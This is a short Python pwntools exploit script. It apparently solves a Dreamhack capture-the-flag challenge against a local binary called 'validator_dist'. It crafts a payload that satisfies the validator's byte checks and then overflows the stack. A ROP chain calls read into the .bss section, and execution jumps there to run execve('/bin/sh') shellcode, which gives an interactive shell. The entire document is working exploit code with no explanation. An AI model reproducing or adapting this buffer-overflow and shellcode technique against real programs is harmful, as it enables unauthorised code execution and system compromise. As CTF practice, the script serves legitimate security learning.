from pwn import *

p = process("validator_dist")
e = ELF("validator_dist")
r = ROP(e)

context.arch = "amd64"
#context.log_level = 'debug'
gdb.attach(p)

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))

read_plt = e.plt["read"]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
bss = e.bss()


payload = b"DREAMHACK!"
list = []

for i in range(118, -1, -1):
        list.append(i)

payload += bytes(list)
payload += b"B"*7

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(len(payload)+1)
payload += p64(read_plt)

payload += p64(bss)

sleep(0.5)
p.send(payload)
pause()
sleep(0.5)
p.send(shellcode)

p.interactive()


